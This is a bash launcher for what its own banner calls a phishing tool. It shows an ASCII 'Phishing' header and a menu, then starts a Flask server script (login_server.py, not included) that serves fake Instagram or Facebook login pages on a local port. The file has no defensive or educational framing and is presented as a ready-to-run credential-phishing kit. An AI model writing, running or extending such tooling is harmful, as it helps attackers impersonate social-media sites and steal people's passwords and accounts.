#!/bin/bash

# ASCII Art Greeting - Phishing Theme
print_ascii_art() {
    clear
    echo "        __________.__    .__       .__    .__                "
    echo "        \______   \  |__ |__| _____|  |__ |__| ____    ____   "
    echo "         |     ___/  |  \|  |/  ___/  |  \|  |/    \  / ___\ "
    echo "         |    |   |   Y  \  |\___ \|   Y  \  |   |  \/ /_/  >"
    echo "         |____|   |___|  /__/____  >___|  /__|___|  /\___  / "
    echo "                       \/        \/     \/        \//_____/  "
    echo ""
    echo "           ** Welcome to the Script404Haven **              "
    echo "             Please choose an option below:             "
}

# Loading Animation Function
loading_animation() {
    echo -n "Loading"
    for i in {1..5}; do
        echo -n "."
        sleep 0.5
    done
    echo ""
}

# Function to start the Flask server with Instagram
start_instagram_server() {
    # Check if the Python server script exists
    if [[ ! -f "login_server.py" ]]; then
        echo "Error: login_server.py not found!"
        exit 1
    fi

    # Start the Flask server
    echo "Starting Instagram login page... Go to http://localhost:5000"
    python3 login_server.py instagram
}

# Function to start the Flask server with Facebook
start_facebook_server() {
    # Check if the Python server script exists
    if [[ ! -f "login_server.py" ]]; then
        echo "Error: login_server.py not found!"
        exit 1
    fi

    # Start the Flask server
    echo "Starting Facebook login page... Go to http://localhost:5000"
    python3 login_server.py facebook
}

# Main Execution
print_ascii_art
read -p "Are you ready to start this tool? Hit Enter to proceed..."

# Loading animation
loading_animation

# Typing effect for menu options
for char in "1. Instagram   2. Facebook"; do
    echo -n "$char"
    sleep 0.05
done
echo ""

# Prompt the user for a choice
read -p "Enter your choice: " choice

if [[ "$choice" == "1" ]]; then
    start_instagram_server
elif [[ "$choice" == "2" ]]; then
    start_facebook_server
else
    echo "Invalid option. Exiting the script."
    exit 1
fi
